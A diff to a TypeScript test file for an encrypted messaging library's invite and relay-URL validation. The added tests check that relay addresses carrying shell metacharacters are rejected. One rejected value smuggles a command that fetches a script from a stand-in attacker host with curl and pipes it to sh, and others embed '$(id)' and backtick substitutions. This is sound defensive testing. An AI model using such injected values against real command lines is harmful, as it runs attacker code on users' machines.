@@ -1,7 +1,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import {
-  type ThreadEvent, b64u, canonicalBytes, canonicalize, hpke, decodeInvite, deviceId, encodeInvite, generateSigningKey, issueDevice,
+  type ThreadEvent, b64u, canonicalBytes, canonicalize, hpke, decodeInvite, deviceId, encodeInvite, generateSigningKey, isRelayUrl, issueDevice,
   open, parseCanonical, parseEvent, randomId, safetyCode, seal, sign, unb64u, utf8, verify, verifyCredential,
 } from "../src/index.ts";
 
@@ -129,8 +129,16 @@ test("invites round trip and reject bad relays and expiry", async () => {
   const invite = { v: 1 as const, relay: "ws://127.0.0.1:1", credential: alice.credential, token: randomId(), expiresAt: Date.now() + HOUR };
   assert.deepEqual(decodeInvite(encodeInvite(invite)), invite);
   assert.throws(() => decodeInvite(encodeInvite({ ...invite, relay: "http://x" })), /ws/);
+  assert.throws(() => decodeInvite(encodeInvite({ ...invite, relay: "ws://x/;sh" })), /plain/);
   assert.throws(() => decodeInvite(encodeInvite(invite), invite.expiresAt + 1), /expired/);
   assert.throws(() => decodeInvite("hello"), /not an invite/);
+});
+
+test("relay addresses hold nothing a shell would act on", () => {
+  for (const ok of ["ws://127.0.0.1:7447", "wss://a-b.example.com/relay/v1", "ws://[::1]:7447", "WSS://Host.Example:443/", "ws://h/%20~_."]) assert.ok(isRelayUrl(ok), ok);
+  // A contact's list is printed as `cpart relay add <url>`.
+  for (const bad of ["ws://relay.example/;curl${IFS}-s${IFS}evil.example|sh", "ws://h/$(id)", "ws://h/`id`", "ws://h/a&b", "ws://h/a'b", 'ws://h/a"b', "ws://h/a>b", "ws://h/a*", "ws://h/!x", "ws://h:1/(x)", "ws://u@h", "ws://h/?q", "ws://h/#f", "ws://h/a\\b", "ws://h/a b", "http://h", "ws://h_x"])
+    assert.ok(!isRelayUrl(bad), bad);
 });
 
 test("safety code is symmetric and differs per pair", async () => {
